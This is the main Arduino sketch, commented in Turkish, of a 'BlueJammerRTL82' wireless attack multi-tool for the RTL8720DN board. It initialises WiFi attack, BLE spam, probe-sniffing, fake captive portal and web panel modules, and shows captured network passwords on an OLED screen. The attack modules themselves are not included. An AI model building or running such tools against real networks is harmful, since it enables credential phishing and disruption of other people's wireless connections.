// bluejammerrtl82.ino
// RTL8720DN (BW16) tabanlı siber güvenlik çoklu aracı projesi ana taslağı.

// Standart Arduino Kütüphaneleri
#include <Arduino.h>
#include <SPI.h>
#include <Wire.h>

// Ekran Kütüphaneleri (SSD1306 OLED 128x64)
#include <Adafruit_GFX.h>
#include <Adafruit_SSD1306.h>

// WiFi Kütüphanesi (RTL8720DN SDK için)
#include <WiFi.h>

// BLE Kütüphanesi (RTL8720DN SDK) — yalnizca gercek BLE varsa
#ifdef REAL_BLE
#include <BLE.h>
#include <BLEAdvert.h>
#include <BLEDevice.h>
#endif

// Proje Özel Başlık Dosyaları (daha sonra oluşturulacak)
// Bu dosyalar, projenin farklı modüllerini içerecektir.
#include "config.h"          // Pin tanımları ve genel yapılandırma
#include "ButtonHandler.h"   // Buton girişlerini yönetir
#include "DisplayManager.h"  // OLED ekranı yönetir
#include "MenuManager.h"     // Kullanıcı arayüzü menülerini yönetir
#include "WiFiManager.h"     // WiFi bağlantılarını ve taramalarını yönetir
#include "BLEManager.h"      // Bluetooth Low Energy (BLE) işlemlerini yönetir
#include "WiFiAttacks.h"     // Çeşitli WiFi saldırı modülleri
#include "ProbeSniffer.h"    // WiFi probe isteklerini yakalar
#include "BLESpam.h"         // Bluetooth Low Energy spam
#include "CaptivePortal.h"   // Sahte erişim noktası (Captive Portal) oluşturur
#include "WebPanel.h"        // Web tarayicidan kontrol paneli

// Global Nesneler
WebPanel webPanel;
WiFiManager wiFiManager;
BLEManager bleManager;
ButtonHandler buttonHandler;
DisplayManager displayManager;
MenuManager menuManager;
WiFiAttacks wiFiAttacks;
ProbeSniffer probeSniffer;
BLESpam bleSpam;
CaptivePortal captivePortal;

void setup() {
  Serial.begin(115200);
  Serial.println(F("BlueJammerRTL82 Baslatiliyor..."));

  wiFiManager.begin();
  bleManager.begin();
  displayManager.begin();
  buttonHandler.begin();
  wiFiAttacks.begin(&wiFiManager);
  probeSniffer.begin();
  bleSpam.begin();
  captivePortal.begin();
  webPanel.begin(&wiFiManager, &wiFiAttacks, &bleSpam, &captivePortal, &probeSniffer);

  // Menuyu baslat
  menuManager.begin(&buttonHandler, &displayManager);

  // Boot ekranini goster
  displayManager.showBootScreen();
  delay(BOOT_SPLASH_DURATION);
}

void loop() {
  buttonHandler.update();
  menuManager.update();

  // Saldiri modulu guncellemeleri (non-blocking)
  wiFiAttacks.update();
  bleSpam.update();
  probeSniffer.update();
  captivePortal.update();
  webPanel.update();

  // BACK tusu menu tarafindan tüketilir, ama saldiri modulleri
  // menuManager.isActionRunning() uzerinden stop edilir
  if (!menuManager.isActionRunning()) {
    if (wiFiAttacks.isAnyRunning())  wiFiAttacks.stopAll();
    if (captivePortal.isRunning())   captivePortal.stop();
    if (bleSpam.isRunning())         bleSpam.stop();
    if (probeSniffer.isRunning())    probeSniffer.stop();
    if (webPanel.isRunning())        webPanel.stop();
  }

  // Yakalanan sifreleri OLED'de goster
  if (captivePortal.hasNewCapture()) {
    CapturedCredential* cred = captivePortal.getNewCaptured();
    if (cred) {
      displayManager.clear();
      displayManager.setTextSize(1);
      displayManager.setTextColor(SSD1306_WHITE);
      displayManager.setCursor(0, 0);
      displayManager.println("SIFRE YAKALANDI!");
      displayManager.println("");
      displayManager.print("Ag: ");
      displayManager.println(cred->ssid);
      displayManager.print("Sifre: ");
      displayManager.println(cred->password);
      displayManager.display();
      delay(5000);
      for (int i = 0; i < captivePortal.getCapturedCount(); i++) {
        captivePortal.markDisplayed(i);
      }
    }
  }
}
